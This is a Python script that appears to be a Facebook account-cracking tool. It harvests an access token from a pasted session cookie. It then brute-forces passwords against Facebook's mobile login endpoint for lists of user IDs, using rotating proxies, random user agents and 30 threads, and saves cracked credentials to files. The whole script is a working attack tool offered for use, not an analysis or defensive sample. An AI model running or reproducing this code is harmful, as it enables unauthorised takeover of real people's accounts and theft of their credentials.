import requests, bs4, json, os, sys, random, datetime, time, re, base64
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as rprint
from time import sleep

# Console Setup
sol = sol()

# Colors
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = "\033[1;97m"
B = '\033[1;36m'

# Proxy Setup (Only Fetch Once)
try:
    prox = requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text.splitlines()
except:
    prox = []

# User-Agent List
ua_list = [
    "Mozilla/5.0 (Linux; Android 10; SM-A750FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
]

# Function to Generate Random User-Agent
def get_random_ua():
    return random.choice(ua_list)

# Login
def login():
    os.system('clear')
    cookie = input(f'Enter Facebook Cookies: ')
    with requests.Session() as session:
        try:
            response = session.get(
                'https://www.facebook.com/x/oauth/status',
                cookies={'cookie': cookie}
            )
            if '"access_token":' in response.text:
                token = re.search('"access_token":"(.*?)"', response.text).group(1)
                open(".token.txt", "w").write(token)
                print('Login Successful!')
            else:
                print("Invalid Cookies!")
        except:
            print('Error logging in')

# Crack Function
def crack(id, pw_list):
    global loop, ok, cp
    session = requests.Session()
    ua = get_random_ua()
    
    for pw in pw_list:
        try:
            nip = random.choice(prox)
            proxy = {'http': 'socks4://' + nip}
            
            session.headers.update({"User-Agent": ua})
            login_page = session.get(f'https://m.facebook.com/login/device-based/password/?uid={id}')
            
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', login_page.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', login_page.text).group(1),
                "uid": id,
                "pass": pw,
                "next": "https://m.facebook.com/login/save-device/"
            }
            
            response = session.post(
                'https://m.facebook.com/login/device-based/validate-password/',
                data=data, allow_redirects=False, proxies=proxy
            )
            
            if "checkpoint" in response.cookies.get_dict():
                print(f'CP: {id} | {pw}')
                open('CP.txt', 'a').write(f'{id}|{pw}\n')
                cp += 1
                break
            elif "c_user" in response.cookies.get_dict():
                print(f'OK: {id} | {pw}')
                open('OK.txt', 'a').write(f'{id}|{pw}\n')
                ok += 1
                break
        except requests.exceptions.ConnectionError:
            sleep(5)

# Multi-threaded Password Cracking
def start_cracking(ids, passwords):
    with ThreadPool(max_workers=30) as executor:
        for user_id in ids:
            executor.submit(crack, user_id, passwords)

# Start
if __name__ == '__main__':
    login()
